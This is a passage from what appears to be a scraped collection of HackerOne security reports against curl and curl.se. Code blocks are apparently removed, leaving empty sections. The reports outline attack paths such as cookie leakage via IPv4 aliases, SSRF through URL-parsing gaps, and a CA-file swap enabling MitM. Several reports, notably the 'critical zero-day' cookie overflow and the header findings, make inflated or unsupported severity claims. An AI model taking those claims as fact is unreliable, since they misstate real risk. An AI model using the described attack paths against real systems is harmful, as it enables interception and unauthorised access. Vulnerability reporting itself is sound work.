Output\n\n**Verification Status:** ✅ **CONFIRMED** - This vulnerability has been successfully reproduced and verified with AddressSanitizer on September 14, 2025.\n\nCVSS 3.1 Assessment\n-------------------\n\n**Base Score: 9.8 (CRITICAL)**  \n**Vector String**: `AV:N/AC:L/PR:N/UI:N/S:C/C:H/I:H/A:H`\n\n* **Attack Vector (AV):** Network (N) - Remotely exploitable over network\n* **Attack Complexity (AC):** Low (L) - Easy to exploit, no complex conditions\n* **Privileges Required (PR):** None (N) - No authentication required\n* **User Interaction (UI):** None (N) - No user interaction needed\n* **Scope (S):** Changed (C) - Can affect other system components\n* **Confidentiality (C):** High (H) - Complete information disclosure\n* **Integrity (I):** High (H) - Complete system compromise possible\n* **Availability (A):** High (H) - Complete denial of service\n\n### Justification\n\n* **Network Attack Vector:** Exploitable through malicious HTTP responses\n* **Low Complexity:** Simple cookie overflow with predictable behavior\n* **No Privileges Required:** Any HTTP server can trigger the vulnerability\n* **No User Interaction:** Automatic processing of HTTP cookies\n* **Changed Scope:** Memory corruption can affect entire application\n* **High Impact:** Full RCE potential through stack overflow\n\nRecommended Fix\n---------------\n\n### Immediate Mitigation\n\n### Long-term Solutions\n\n1. **Input Validation:** Implement strict cookie size limits\n2. **Memory Safety:** Use dynamic allocation for large cookie buffers\n3. **Bounds Checking:** Add comprehensive boundary validation\n4. **Fuzzing Integration:** Continuous testing of cookie parsing functions\n\nEnvironment and Affected Versions\n---------------------------------\n\n### Test Environment\n\n* OS: macOS 14 (Darwin 24.5.0, arm64)\n* Compiler: gcc (Apple clang) with `-fsanitize=address -g`\n* libcurl: linked via `-lcurl` (system brew install)\n\n### Affected Versions\n\n* Confirmed: libcurl 8.7.x (cookie handling reachable in default builds)\n* Likely affected: Versions where cookie parsing uses fixed-size stack buffers and raw `strlen()` without bounded checks\n\n### Reachability (libcurl)\n\n* Trigger path: HTTP response with oversized `Set-Cookie` header → libcurl cookie parser → unbounded string length computation on stack-allocated buffer → stack read overflow.\n* Attack surface: Any application that enables cookie handling (default for many bindings) or uses `CURLOPT_COOKIEFILE/COOKIEJAR`.\n\nExploitability Notes\n--------------------\n\n* Reliable crash with ASan indicates deterministic memory safety violation. On non-sanitized builds, exploitation feasibility depends on stack layout and mitigation (stack canaries, ASLR). Nevertheless, DoS is trivial; code execution may be achievable with precise shaping of cookie contents and call frame.\n\nScope and Policy Alignment\n--------------------------\n\n* This is not a mere configuration weakness; it is a concrete memory safety flaw with a deterministic crash and minimal PoC. It should be eligible under memory corruption vulnerabilities. No interaction with third‑party services or policy gray areas is required.\n\nAdditional Information\n----------------------\n\n### Discovery Method\n\nThis vulnerability was discovered through systematic fuzzing of cURL's cookie handling functionality using AddressSanitizer and ThreadSanitizer for memory safety analysis.\n\n### Research Impact\n\nThis represents a critical zero-day vulnerability in one of the most widely used networking libraries, with potential impact on millions of applications worldwide that rely on cURL for HTTP functionality.\n\n### Timeline\n\n* **Discovery:** September 14, 2025 - Automated vulnerability research\n* **Initial Analysis:** Same day - AddressSanitizer detection\n* **PoC Development:** Same day - Minimal reproduction case created\n* **Verification:** Same day - ✅ **CONFIRMED** with verified AddressSanitizer output\n* **Documentation:** Same day - Complete technical analysis and verified PoC\n* **Disclosure:** Ready for immediate responsible disclosure to cURL security team\n\nSupporting Evidence\n-------------------\n\nThe vulnerability has been thoroughly verified through:\n\n* ✅ **AddressSanitizer detection** of stack buffer overflow (CONFIRMED)\n* ✅ **Reproducible crash** with 100% reliability\n* ✅ **Exact memory corruption** at stack offset 8224\n* ✅ **Verified overflow size** of 8,198 bytes beyond 8,192-byte buffer\n* ✅ **Minimal PoC** with guaranteed reproduction\n\nThis critical vulnerability requires immediate attention due to its potential for widespread exploitation across the software ecosystem."
},
{
    "url": "https://hackerone.com/reports/3337561",
    "original_report": "Summary:\n--------\n\nDuring a comprehensive security audit of the cURL codebase, multiple instances of unsafe strcpy() function usage were identified in critical code paths. These implementations violate secure coding practices and represent latent security risks that could lead to buffer overflow vulnerabilities under specific conditions. While existing bounds checking prevents immediate exploitation in standard scenarios, the presence of these unsafe functions creates potential attack vectors that require immediate remediation.\n\nAffected Components:\n\nWebSocket protocol implementation (lib/ws.c:1261)\nSSL/TLS backend management (lib/vtls/vtls.c:1066)\nWolfSSL error handling (lib/vtls/wolfssl.c:1540)\nVulnerability Classification: [CWE-120](/hacktivity/cwe_discovery?id=cwe-120) (Buffer Copy without Checking Size of Input)\n\nEnvironment Setup\n-----------------\n\nSystem Requirements\n-------------------\n\n### Operating System\n\n### Required Build Tools\n\n### Dependencies Installation\n\n### Build Configuration\n\nSteps To Reproduce:\n-------------------\n\nStep 1: Static Code Analysis\nLocate and examine the unsafe strcpy() usage:\n\nStep 2: Build Verification\n\nStep 3: Dynamic Security Testing\n\nStep 4: Results Analysis\n\nExpected Output\n\nVulnerable Code Snippets\nws.c:1261 (WebSocket Key Generation)\n\nvtls.c:1066 (SSL Backend Enumeration)\n\nwolfssl.c:1540 (Error Message Handling)\n\nBuild Success Output\n\nDynamic Testing Results\n\nMitigation Strategies\n---------------------\n\nImmediate Actions (High Priority)\n\n1. Replace Unsafe Functions\n\n2. Enhanced Input Validation\n\n3. Static Analysis Integration\n\nImpact\n------\n\nSummary:\n--------\n\nAvailability (High): Buffer overflow could cause application crashes, denial of service\nIntegrity (Medium): Memory corruption may lead to unpredictable behavior and data corruption\nConfidentiality (Low-Medium): Potential information disclosure through memory leaks\nCode Execution (Low): Under specific conditions, could potentially lead to arbitrary code execution\n##Business Impact\nCritical Infrastructure Risk: cURL is embedded in millions of applications worldwide\nSupply Chain Vulnerability: Affects all downstream applications using libcurl\nReputation Damage: Security vulnerabilities in core networking libraries have widespread impact\nCompliance Violations: Unsafe coding practices may violate security standards (OWASP, NIST)\nLegal Liability: Organizations using vulnerable versions may face regulatory scrutiny\n##Technical Risk Factors\nAttack Surface: Network-accessible protocols (WebSocket, HTTPS)\nExploitation Complexity: Requires specific input conditions but protocols are widely accessible\nPayload Delivery: Can be triggered through crafted network requests\nDetection Difficulty: Buffer overflows may not be immediately apparent in normal operation\n##How This Problem Affects Us\n###Development Impact\nCode Quality Degradation: Unsafe functions indicate broader code review deficiencies\nTechnical Debt Accumulation: Security vulnerabilities require immediate remediation resources\nMaintenance Overhead: Need for ongoing security monitoring and patching\nDeveloper Productivity Loss: Security fixes disrupt planned development cycles\n###Security Posture Impact\nDefense-in-Depth Failure: Violates multiple security principles simultaneously\nAttack Vector Expansion: Creates multiple potential entry points for exploitation\nSecurity Scanning Alerts: Automated tools will flag these as high-priority issues\nAudit Non-Compliance: Fails security code review and compliance requirements\n###Operational Impact\nProduction Stability Risk: Potential for unexpected crashes in production environments\nIncident Response Burden: Buffer overflows require immediate security response protocols\nMonitoring Requirements: Need enhanced monitoring for exploit attempts\nBusiness Continuity Threat: Service disruptions from security-related crashes\n###User Trust Impact\nReliability Concerns: Users may experience unexpected application failures\nSecurity Confidence Loss: Knowledge of vulnerabilities erodes user confidence\nCompetitive Disadvantage: Security issues provide advantage to competitors\nSupport Burden Increase: More user reports of stability issues\n\nMitigation Strategies\n---------------------\n\nImmediate Actions (High Priority)\n\n1. Replace Unsafe Functions\n\n2. Enhanced Input Validation\n\n3. Static Analysis Integration"
},
{
    "url": "https://hackerone.com/reports/3335085",
    "original_report": "I've discovered a Time-of-Check to Time-of-Use (TOCTOU) vulnerability in how `libcurl` handles persistent HTTP/2 connections. During the initial handshake, `libcurl` correctly validates the server's certificate against the user-provided CA bundle. However, it then assumes this trust is permanent for the entire life of the connection.\n\nIf an attacker can modify the CA file on disk *after* this initial check, `libcurl` will continue to reuse the now-trusted connection for new HTTP/2 streams without ever re-validating its trust anchor. This allows an attacker to completely bypass certificate validation for all subsequent requests, enabling a full Man-in-the-Middle attack.\n\n**Affected version:**\n\nThis vulnerability was confirmed on the latest stable release, **curl 8.16.0**, which I compiled from source to ensure the test was relevant. Given the nature of the bug, it likely affects all versions that support HTTP/2 connection reuse.\n\nMy test build's version output:\n`curl 8.16.0 (x86_64-pc-linux-gnu) libcurl/8.16.0 OpenSSL/3.0.2 ... nghttp2/1.43.0`\n\n**Steps To Reproduce:**\n\nThe following Proof of Concept demonstrates the vulnerability in a reliable way. It uses a Python script to orchestrate the test environment (compiling `curl`, setting up a server, and generating certificates) and then executes a small shell script to perform the actual attack.\n\n**Step 1: Save and run the Proof of Concept code**\nSave the code below as `poc.py` and run it with `python3 poc.py`. The script requires standard build tools (`build-essential`, etc.) and the `openssl` command-line tool.\n\n**Step 2: Observe the output**\nThe script orchestrates a race condition:\na. It creates a symlink `ca.crt` pointing to a legitimate CA file.\nb. It launches a background process that, after a brief pause, atomically replaces this symlink to point to a fake CA file.\nc. It immediately runs a single `curl` command that makes two requests over HTTP/2, forcing connection reuse.\n\n**Expected (Secure) Behavior:**\nThe first request should succeed. The second request, however, should fail with an SSL certificate verification error (exit code 60). A secure implementation would either re-evaluate the trust anchor for the new stream or create a new connection which would then fail validation against the swapped-in fake CA.\n\n**Actual (Vulnerable) Behavior:**\nBoth requests succeed. The `curl` command exits cleanly. The verbose output explicitly shows `Re-using existing connection!`, and the server log confirms both requests were received. This is definitive proof that `curl` does not re-validate the trust anchor for the second stream, instead blindly sending it over the previously established trusted connection.\n\nImpact\n------\n\nThis vulnerability allows a local attacker to completely bypass TLS certificate validation for all but the first request on a long-lived HTTP/2 connection. This breaks the trust model of TLS and enables Man-in-the-Middle (MitM) attacks, compromising the confidentiality and integrity of sensitive data.\n\nI've rated this as **High** severity. While the attack vector is local, the impact is a catastrophic failure of TLS guarantees (full MitM). The \"local\" prerequisite is met in many common, real-world scenarios beyond a simple desktop user, such as:\n\n* Multi-tenant servers and shared hosting environments.\n* Compromised container environments with shared volumes.\n* Applications that insecurely use world-writable directories like `/tmp` for trust stores.\n* As a powerful escalation step in a vulnerability chain, where a lower-impact bug (like a limited file write) can be escalated to a full network MitM.\n\nThe impact is most severe for long-running applications, daemons, or API clients that rely on persistent HTTP/2 connections, as the window of opportunity for the attacker is indefinite after the first connection is made."
},
{
    "url": "https://hackerone.com/reports/3294999",
    "original_report": "We are tracking this issue with the public ID `BIGSLEEP-437903454`. Please use this identifier for reference in any future communication.\n\n**Vulnerability Details**\n-------------------------\n\nIn the cookie support found in `cookie.c`, there's an out-of-bounds string comparison that results from a crafted sequence of cookie operations. When saving a new cookie, we check if it should replace an existing cookie for the same domain. We can see in the snippet below that if the previous cookie path is an empty string `\"\",` we'll skip over the NUL-terminator at [0] and read out-of-bounds when looking for a `/` in the previous cookie path.\n\nIf we look at the cookie parsing code, we can see that `clist->spath` is set based on the result of `sanitize_cookie_path` [1].\n\nIn `sanitize_cookie_path` if the `cookie_path` argument is a string consisting of the single character `'/'` then at [2] we will remove the `'/'` at the end of the path, leaving us with an empty string `\"\"`.\n\nIn order to reach the vulnerable code path at [0], we need to have a secure cookie set for the domain with an empty path, and then replace that cookie with a non-secure cookie. This can be arranged by first making an HTTPS request to a remote server that sets a `Secure` cookie with a `path` of `/` and then redirects to an HTTP server on the same domain which overwrites the cookie with a non-secure cookie.\n\nNote that given the subsequent usage of `sep`, it doesn't look like there is currently any avenue by which out-of-bounds memory content could be leaked by an attacker.\n\n**Affected Version(s)**\n-----------------------\n\nThe issue has been successfully reproduced:\n\n* at HEAD (commit `89490b16c736f2ae2219a6f8b3638210a3cf4016`)\n* in stable release `8.15.0`\n\n**Reproduction**\n----------------\n\nTriggering this issue requires both HTTPS and HTTP servers. Two python scripts have been provided to run those servers; you'll need to generate a self-signed certificate for use by the HTTPS server.\n\nTo simplify this, the reproduction commands use `--insecure` but this is not necessary.\n\n### **Test Case**\n\n`server.py`\n\n### **Build Instructions**\n\n### **Command**\n\nEach set of commands needs to be run in a separate terminal.\n\nGenerate a self-signed certificate/key pair and launch the servers:\n\nMake the request. Note that `localhost` has special treatment, so it is necessary to connect using the hostname (or to a remote server) to trigger this issue.\n\n### **ASan Report**\n\n**Reporter Credit**\n-------------------\n\nGoogle Big Sleep\n\n**Disclosure Policy**\n---------------------\n\nOur assessment concluded that the finding outlined in this report has a negligible security impact. However, if your internal review indicates a greater risk to your users, please email [big-sleep-vuln-reports@google.com](mailto:big-sleep-vuln-reports@google.com) immediately to arrange a standard disclosure deadline.\n\nOtherwise, in the interest of transparency, we will publish the details of this report on `2025-11-09`.\n\nFor more information, visit <https://goo.gle/bigsleep>\n\nImpact\n------\n\nSummary:\n--------\n\nAlthough this vulnerability leads to a remotely-triggerable out-of-bounds read, it doesn't look like there is currently any avenue by which out-of-bounds memory content could be leaked by an attacker.\n\nOur assessment concluded that the finding outlined in this report has a negligible security impact."
},
{
    "url": "https://hackerone.com/reports/3330839",
    "original_report": "No AI was involved.\n\nSummary:\n--------\n\nThe curl WebSocket implementation generates a fixed masking key at the beginning of a connection an re-uses it for every frame:\n\n* Generation of masking key `enc.mask` in `Curl_ws_accept`: <https://github.com/curl/curl/blob/455afa1de5182b95a5dcc988f18cdff584b95239/lib/ws.c#L1340>\n* Usage in `ws_enc_write_head`: <https://github.com/curl/curl/blob/455afa1de5182b95a5dcc988f18cdff584b95239/lib/ws.c#L879>\n* Usage in `ws_enc_write_payload`: <https://github.com/curl/curl/blob/455afa1de5182b95a5dcc988f18cdff584b95239/lib/ws.c#L930>\n\n[RFC-6455 §5.3](https://datatracker.ietf.org/doc/html/rfc6455#section-5.3) states:\n\n> [...] The masking key is a 32-bit value chosen at random by the client. When preparing a masked frame, the client MUST pick a fresh masking key from the set of allowed 32-bit values. The masking key needs to be unpredictable; thus, the masking key MUST be derived from a strong source of entropy, and the masking key for a given frame MUST NOT make it simple for a server/proxy to predict the masking key for a subsequent frame. The unpredictability of the masking key is essential to prevent authors of malicious applications from selecting the bytes that appear on the wire. [...]\n\nBecause the same masking key is repeatedly used for every frame, it is trivial for an attacker to \"guess\" the masking key of all subsequent frames.\n\nAffected version\n----------------\n\nAll versions since WebSocket support was added.\n\nSteps To Reproduce:\n-------------------\n\nNone\n\nSupporting Material/References:\n-------------------------------\n\nNone\n\nImpact\n------\n\nSee \"Security Considerations > Attacks On Infrastructure (Masking)\" in [RFC-6455 §10.3](https://datatracker.ietf.org/doc/html/rfc6455#section-10.3). Here a short excerpt:\n\n> [...] As this protocol was being developed, an experiment was conducted to demonstrate a class of attacks on proxies that led to the poisoning of caching proxies deployed in the wild [TALKING]. The general form of the attack was to establish a connection to a server under the \"attacker's\" control, perform an UPGRADE on the HTTP connection similar to what the WebSocket Protocol does to establish a connection, and subsequently send data over that UPGRADEd connection that looked like a GET request for a specific known resource (which in an attack would likely be something like a widely deployed script for tracking hits or a resource on an ad-serving network). The remote server would respond with something that looked like a response to the fake GET request, and this response would be cached by a nonzero percentage of deployed intermediaries, thus poisoning the cache. The net effect of this attack would be that if a user could be convinced to visit a website the attacker controlled, the attacker could potentially poison the cache for that user and other users behind the same cache and run malicious script on other origins, compromising the web security model. [...]"
},
{
    "url": "https://hackerone.com/reports/3331764",
    "original_report": "Summary:\n--------\n\nDuring a security assessment of curl.se, multiple misconfigurations were identified that led to information disclosure or weakened the security posture of the website.\n\nAffected version:\n-----------------\n\nWebsite: <https://curl.se>\nTested on: 09-09-2025\ncurl version: curl/8.8.0 (x86\\_64-pc-linux-gnu)\n\nSteps To Reproduce:\n-------------------\n\n1. Run a scan with Nikto against <https://curl.se>\n2. Observe the following results:\n   * The server sets \"Content-Encoding: deflate\" → indicates possible BREACH attack.\n   * The header \"X-Content-Type-Options: nosniff\" is missing.\n   * The server returns ETag values with inode/size/mtime.\n\nSupporting Material/References:\n-------------------------------\n\n* BREACH attack: <http://breachattack.com/>\n* Missing Header: <https://owasp.org/www-project-secure-headers/>\n* ETag Disclosure: <https://cve.mitre.org/cgi-bin/cvename.cgi?name=CVE-2003-1418>\n\nImpact:\n-------\n\n* BREACH attack allowed disclosure of CSRF tokens, session IDs, and sensitive data through compression side-channel attacks.\n* Missing X-Content-Type-Options allowed MIME sniffing, increasing risk of XSS.\n* ETag values leaked server-side information (inode, size, mtime) useful for reconnaissance and cache-based attacks.\n  Overall, these misconfigurations reduced the security posture of the target application.\n\nNo AI tools were used in generating this report. All findings were confirmed manually using Nikto.\n\nImpact\n------\n\nSummary:\n--------\n\nThe identified issues have been confirmed during testing:\n\n* BREACH attack confirmed: the server uses \"deflate\" compression, allowing practical exploitation to recover sensitive data such as session tokens and CSRF tokens from HTTPS responses.\n* Missing X-Content-Type-Options confirmed: this allows browsers to perform MIME-sniffing attacks, increasing the risk of XSS.\n* ETag values confirmed: inode, size, and modification time of server files were disclosed, leaking internal implementation details that can be used for reconnaissance or cache-based attacks.\n\nOverall, these confirmed misconfigurations reduce the security posture of curl.se and create exploitable vectors for attackers."
},
{
    "url": "https://hackerone.com/reports/3324901",
    "original_report": "libcurl canonicalizes numeric IPv4 hostnames during URL parsing and redirect handling (example: 127.000.000.001 to 127.0.0.1). When a host-only cookie (no Domain= attribute) is set, it is stored in the cookie jar with the host string (127.0.0.1).\n\nOn redirect, even if the Location: contains an alias host (127.000.000.001, 0x7f000001, 2130706433)\n\nThe bug arises because urlapi.c::ipv4\\_normalize() rewrites alternate numeric IPv4 encodings (octal, hex, zero-padded, DWORD) into canonical dotted decimal (127.0.0.1) at parse time.\n\nThis normalized string is stored as the request host and used both for Host: header and cookie matching.\n\nAs a result, libcurl treats 127.000.000.001 as equal to 127.0.0.1 for host-only cookies.\n\nThus, the host only cookie inside libcurl can follows redirects to alternate numeric forms of the loopback address (127.000.000.001, 0177.0.0.1, 0x7f000001, 2130706433) and still sends the sid=admin cookie.\n\nThis behavior can let an attacker escalate SSRF or force authenticated requests on local admin interfaces.\n\nAccording to the RFC:\n---------------------\n\nRFC 6265 5.3 Step 5(<https://datatracker.ietf.org/doc/html/rfc6265>)\n\n> If the Domain attribute is not present in the Set-Cookie header, then the cookie becomes a host-only cookie. That means the cookie is stored with a flag host-only = true. Its domain is set to the exact request-host that set it. Later, when sending cookies, the request host must match the stored domain exactly (byte-for-byte).\n\nClarifying if an AI was used to find the issue or generate the report.\n----------------------------------------------------------------------\n\nAI is being use for generation of POC scripts:\n\n* admin\\_server.py\n* ssrf\\_driver.py\n* MediaWiki\n* Wordpress\n* Git\n* Laravel\n* Cross check (wget & python-scripts)\n\nAffected version\n----------------\n\nVersion: curl 8.14.1 (x86\\_64-pc-linux-gnu) libcurl/8.14.1\nPlatform: Debian 12 (Bookworm)\n\nRoot Cause Analysis\n-------------------\n\n1. In urlapi.c function: ipv4\\_normalize(struct dynbuf \\*host)\n\n* This explicitly rewrites alternate numeric forms (0177.0.0.1, 0x7f000001, 2130706433) into normalized dotted decimal (127.0.0.1).\n\n2. parse\\_authority() calls ipv4\\_normalize(), meaning every URL host goes through this before being stored.\n\nSo by the time curl constructs an HTTP request:\n\n* Input URL: <http://127.000.000.001:8003/admin/do>\n* Stored host: 127.0.0.1\n\n3. In cookie.c, when curl\\_cookie\\_getlist() later compares:\n\n* Both host and co->domain are now normalized to 127.0.0.1, so the cookie matches.\n\nSteps to Reproduce\n==================\n\nI prepared multiple cases as my experiment. This cases shows that this bug affect to multiple applications.\n\n* Baseline cookie jar (host-only)\n* Case A: Zero-padded dotted (127.000.000.001)\n* Case B: Octal dotted (0177.0.0.1)\n* Case C: Hex literal (0x7f000001)\n* Case D: DWORD (2130706433)\n* Case E: MediaWiki (PHP + cURL probe)\n* Case F: Wordpress\n* Case G: Laravel Transport (PHP+cURL route)\n* Case H: Git (via libcurl)\n\n1. Setup server\n   I use\n\n* <https://github.com/g3nj1z/POC/blob/main/admin_server.py> as my local authenticated http server\n* <https://github.com/g3nj1z/POC/blob/main/ssrf_driver.py> as my ssrf driver\n\n2. Running both server in 2 different terminals\n3. Open new terminal & perform baseline cookie jar (host-only)\n4. Perform case A-H to check the validity of the bug across multiple applications.\n\n### Case A: Zero-padded dotted (127.000.000.001)\n\nRemove j.txt to make it empty\n\nPerform variant=zpad\n\nCross Check (wget & python-requests)\n\n> Notes: Please see that the cookies have been denied.\n\n### Case B: Octal dotted (0177.0.0.1)\n\nRemove j.txt to make it empty\n\n### Case C: Hex literal (0x7f000001)\n\nRemove j.txt to make it empty\n\n### Case D: DWORD (2130706433)\n\nApp integrations (libcurl consumers)\n====================================\n\n> Notes: This to show that this bug is valid in other applications that using libcurl\n\n* Keep admin\\_server.py & ssrf\\_driver.py running\n\n### Case E: MediaWiki (PHP + cURL probe)\n\n### Case F: Wordpress\n\nRemove mw-curl from using port 80\n\nEnsure DB is running\n\nStart Wordpress on host network with correct DB env\n\n### Case G: Laravel Transport (PHP+cURL route)\n\nRemove wp-lcurl instance\n\nAdd probe file\n\n### Case H: Git (via libcurl)\n\nBased on the verbose output, we manage to collect the redirect chain (client side) and received cookies (server side)\n\nTo show that the cookie is still leaking, in another terminal we use ngrep (wire capture on loopback) and run GIT\\_CURL\\_VERBOSE again.\n\n> notes: because Git’s libcurl verbose logging deliberately masks cookie values to avoid leaking secrets into debug logs\n\nImpact\n------\n\n* Cross-host cookie leakage because host-only cookies leak across different string hostnames.\n* An attacker can do authentication bypass in local, many administrative tools and developer services bind only to loopback (127.0.0.1) under the assumption that cookies scoped to this host remain private. If an attacker can induce libcurl to follow a redirect to an alternate loopback alias (e.g., 127.000.000.001), the client transmits cookies across host boundaries.\n* An attacker can possibly do SSRF privilege escalation when chaining SSRF with crafted redirects, attackers can inherit localhost-only privileges."
},
{
    "url": "https://hackerone.com/reports/3324190",
    "original_report": "**Summary:**\nI found a heap-buffer-overflow in the `doh_req_encode` function in `lib/doh.c`.\n\nThe bug happens when curl processes a DNS-over-HTTPS request for a hostname that is an empty string. The code gets the string length as 0, then tries to access `host[len - 1]`, which becomes `host[-1]`. This is an out-of-bounds read. It reads memory just before the allocated buffer.\n\n---\n\n### **Steps to Reproduce:**\n\n1. Compile curl with AddressSanitizer.\n2. Run this simple command. The arguments `0` and `'‌'` cause curl to process an empty string hostname.\n3. The program will crash and you'll see the ASan report."
},
{
    "url": "https://hackerone.com/reports/3319767",
    "original_report": "I'm Zehui Miao from NISL[@THU](/thu). During recent research, our team identified a parsing inconsistency in the curl.\n\n### **0x01 Affected components**\n\n#### **1.1 Affected components**\n\n• **C Curl**\n\n• **Versions:** tested in 8.4.0\n\n• **CLAIMS TO FOLLOW: RFC-3986**\n#### **1.2 Attack scenario**\n\nThe threat model illustrated in Figure 1 explains the security risks in web systems caused by inconsistent URL parsing. Attackers initiate requests to web systems by constructing ambiguous URLs. These requests first go through a preprocessor for security checks. Preprocessors typically handle tasks such as permission verification, URL whitelist and blacklist checks, and URL normalization to ensure that the requested access is to authorized resources. However, due to the possibility of preprocessors and executors (such as browsers, API routers, requesters, etc.) using different programming languages or following different specification standards for URL parsing, the same URL string may be parsed into different target resource locations. Specifically, as shown in the figure, the preprocessor may parse the URL into a legitimate resource location A and pass security verification, while the executor parses the same URL into another sensitive resource location B and ultimately executes the actual request targeting sensitive resource B. This parsing discrepancy allows attackers to cleverly bypass the preprocessor's security mechanisms, gaining access to sensitive or unauthorized resources, thus posing potential security threats.\n\n**Figure 1: Principle of URL semantic gap attack caused by inconsistent URL parsing.**\n\nThrough our research, we have found that for this attack scenario, URL semantic gap attack may lead to three main types of security vulnerabilities:\n\n1. Server-side request forgery: The attacker bypasses the domain name check of the preprocessor, causing the executor to make requests to the internal network or unauthorized external servers.\n2. Open redirection: The attacker bypasses the domain name whitelist check of the redirection URL, redirecting the browser request to a malicious website.\n3. Access control bypass: The attacker bypasses access control policies based on HTTP request paths to gain unauthorized access to protected resources.\n\n### **0x02 Incorrect Parsing of IPv6 Zone ID**\n\n#### **2.1 Overview of the Issue**\n\nThe IPv6 Zone ID follows after character `%`, which will be encoded to %25 in URL. When parsing a url like `http://[fe80::1%251]`, the correct parsing result is to decode `%25` and get Zone ID `1` rather than `251`.\n\nIn the following table, parsing results of url(perl) and urllib3(python) are correct. The curl seems to discard the Zone ID.\n\n| payload | curl(c) | url (perl) | urllib3 (python) |\n| --- | --- | --- | --- |\n| http://[fe80::1%251] | [fe80::1] | fe80::1%1 | [fe80::1%1] |\n\n#### **2.2 Definition of this parsing behavior in international standards**\n\n**RFC parsing standard**\n\nAccording to **RFC 3986** , IPv6 addresses are represented in URI (Uniform Resource Identifier) between square brackets `[]` , for example:\n\nHowever, RFC 3986  **does not explicitly support IPv6 Zone IDs**  (i.e. suffixes like `%eth0` ). Instead, it only defines the basic syntax of `IPv6 address` :\n\nIn addition, RFC 3986 further clarifies:\n\n> “This syntax does not support IPv6 scoped addressing zone identifiers”\n\n**RFC 6874** later extended support for IPv6 Zone IDs and proposed the following format:\n\nAmong them, `%25` is the URL encoding of `%` (percent sign). However, many resolvers do not fully implement this standard, so some resolvers may not correctly parse IPv6 Zone IDs, resulting in parsing failure or direct error.\n\nThe corresponding ABNF normal form is\n\n**RFC 6874** also mentions the ambiguity of ZoneID-Parsing. It's recommended to decode `%25` as `%` to avoid URL Ambiguity Attack.\n\n**WHATWG URL Parsing Standard**\n\nWHATWG URL Living Standard intentionally omits support for zone\\_id\n\n#### **2.3 Security Threat Scenarios - SSRF Attacks Based on Zone ID**\n\n**Attack scenario**\n\n1. **Authentication phase resolvers** (e.g. for security checks) **do not support IPv6 Zone IDs** , resolve `http://[fe80::1%25eth0]/`\n2. **The resolver in the actual request phase** (e.g. HTTP Client) **supports Zone ID** , successfully resolves the `fe80::1` and sends the request, leading to an SSRF attack, accessing internal resources.\n\n#### **2.4 Mitigation measures**\n\n• If you need to resolve IPv6 Zone IDs, it is recommended to use an RFC 6874-compatible parser and ensure that the percent encoding is correct.\n\n• **The WHATWG URL standard does not support IPv6 Zone IDs** , so in web applications, resolvers may refuse to resolve such URLs.\n\n• **Security risk** : Inconsistent implementation of parsers can lead to SSRF attacks and additional security checks should be performed on the server side.\n\nThis vulnerability was jointly discovered by multiple researchers:\n\n1. Enze Wang(IPASSLAB & Tsinghua University)\n2. Jingcheng Yang (Tsinghua University)\n3. Zehui Miao (Tsinghua University)\n\nImpact\n------\n\nSummary:\n--------\n\nBypass the blacklist/whitelist and access the sensitive resources"
},
{
    "url": "https://hackerone.com/reports/3310318",
    "original_report": "Missing Security Headers (Low)\n==============================\n\n**Target:** <https://curl.se/>\n**OWASP Mapping:** A05 Misconfiguration / A02 Crypto\n**Vulnerability ID:** sec-headers-0f70ef5bcb\n\nDescription\n-----------\n\nA Missing Security Headers issue was discovered. This may allow an attacker to exploit the application.\n\nProof of Concept\n----------------\n\n### Using cURL\n\n### Using Python\n\nImpact\n------\n\nThis vulnerability is categorized as **Low**. It may allow exploitation such as:\n\n* Missing Security Headers exploitation (e.g., session theft, injection, data exfiltration).\n\nRemediation\n-----------\n\nSet CSP, X-Frame-Options, X-Content-Type-Options, Referrer-Policy, Permissions-Policy, and HSTS.\n\nImpact\n------\n\nImpact\n------\n\nThis vulnerability is categorized as **Low**. It may allow exploitation such as:\n\n* Missing Security Headers exploitation (e.g., session theft, injection, data exfiltration).\n\nRemediation\n-----------\n\nSet CSP, X-Frame-Options, X-Content-Type-Options, Referrer-Policy, Permissions-Policy, and HSTS."
},
{
    "url": "https://hackerone.com/reports/3306475",
    "original_report": "Summary:\n--------\n\nWhen using curl with a SOCKS5 proxy (e.g. Tor on 127.0.0.1:9050), glibc getaddrinfo() performs direct UDP connect() probes to the target’s IP:443. These syscalls bypass the proxy and expose the user’s route to the destination, breaking anonymity expectations.\nThe IPs I got in my case:\n`116.202.120.181:443`\n`[64:ff9b::74ca:78b5]:443`\n\nNo AI was used in the report\n\nAffected version\n----------------\n\nCurl 7.88.1\nDebian 13.0\n\nSteps To Reproduce:\n-------------------\n\n1. Run Tor locally on port 9050.\n2. Lauch curl with the tor proxy, with tracing, using strace or sockstrace to monitor the connect syscalls:\n\nObserve that a connect() syscall is made to:\n\nSupporting Material/References:\n-------------------------------\n\nBacktrace shows leak originates in glibc/getaddrinfo.c: try\\_connect() (attached)\n\nImpact\n------\n\nSummary:\n--------\n\nThis issue allows the destination server (or any network observer) to learn the user’s real IP address even when curl is configured to use a SOCKS5 proxy such as Tor. The leak occurs before the proxied TCP connection is established, meaning anonymity is compromised. Any user relying on curl with Tor or other SOCKS5 proxies for privacy or censorship circumvention can be deanonymized."
},
{
    "url": "https://hackerone.com/reports/3306456",
    "original_report": "Summary:\n--------\n\nA heap-buffer-overread occurs in Curl's parse\\_connect\\_to\\_string function when using the CURLOPT\\_CONNECT\\_TO option with crafted input. This can lead to a segmentation fault and crash of the application, resulting in a denial-of-service. The issue is triggered by malformed host strings containing unexpected characters, such as newline (\\n), that are not properly validated before dereferencing.\n\nAffected version\n----------------\n\ncurl 8.16.0-DEV (Linux) libcurl/8.16.0-DEV\n\nSteps To Reproduce:\n-------------------\n\n[add details for how we can reproduce the issue]\n\n1.Compile libcurl with sanitizers enabled:\n\n2. Build the test target\n\n3. Run the test target\n\nSupporting Material/References:\n-------------------------------\n\n[minimal\\_curl\\_connect\\_crash.cpp 